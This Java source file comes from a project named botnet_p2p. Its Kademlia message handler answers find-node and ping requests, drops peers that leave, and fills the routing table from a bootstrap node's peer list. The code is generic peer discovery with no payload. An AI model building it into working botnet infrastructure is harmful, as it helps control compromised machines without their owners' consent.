package botnet_p2p.business_logic_layer;

import botnet_p2p.model.KademliaPeer;
import botnet_p2p.p2p_layer.P2pLayer;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.List;
import java.util.stream.Collectors;

import static botnet_p2p.MessageOuterClass.Message;


class KadMessageHandler {
    private static final Logger logger = LogManager.getLogger(KadMessageHandler.class);

    private P2pLayer p2pLayer;
    private KademliaPeer me;

    public KadMessageHandler(P2pLayer p2pLayer, KademliaPeer me) {
        this.p2pLayer = p2pLayer;
        this.me = me;
    }

    void handleFindNode(Message message) {
        KademliaPeer sender = KademliaPeer.fromContact(message.getSender());

        // respond with nearest nodes list, except sender node
        List<KademliaPeer> nearestPeers = this.p2pLayer.getNearestPeers(
                message.getFindNode().getGuid())
                .stream()
                .filter(kademliaPeer -> !kademliaPeer.getGuid().equals(sender.getGuid()))
                .collect(Collectors.toList());
        p2pLayer.foundNodes(sender, me, nearestPeers);
        addToRoutingTable(sender);
    }

    void handleLeaveMessage(Message message) {
        KademliaPeer sender = KademliaPeer.fromContact(message.getSender());

        // remove from routing table
        p2pLayer.removeFromRoutingTable(sender);
        logger.info(sender.getGuid() + " said goodbye");
    }

    void handlePingMessage(Message message) {
        KademliaPeer sender = KademliaPeer.fromContact(message.getSender());

        // respond
        p2pLayer.pingResponse(sender, me);
        addToRoutingTable(sender);
    }

    void handleFoundNodes(Message message, List<KademliaPeer> pingedNodes) {
        // bootstrapNode responded, adding it to routing table
        KademliaPeer sender = KademliaPeer.fromContact(message.getSender());
        addToRoutingTable(sender);

        message.getFoundNodes().getNodesList().forEach(contact -> {
            if (!contact.getGuid().equals(me.getGuid())) {
                // pinging nodes that we got from bootstrapNode
                KademliaPeer peer = KademliaPeer.fromContact(contact);
                logger.info("pinging node: " + peer.getGuid());
                p2pLayer.ping(peer, me, false);
                pingedNodes.add(peer);
            }
        });
    }

    void handlePingResponse(Message message, List<KademliaPeer> pingedNodes) {
        // peer responded to ping, so it's alive - we can add it to routing table
        KademliaPeer sender = KademliaPeer.fromContact(message.getSender());
        addToRoutingTable(sender);

        pingedNodes.remove(sender);
    }

    void addToRoutingTable(KademliaPeer sender) {
        // add sender to routing table
        this.p2pLayer.addToRoutingTable(
                sender
        );
    }
}
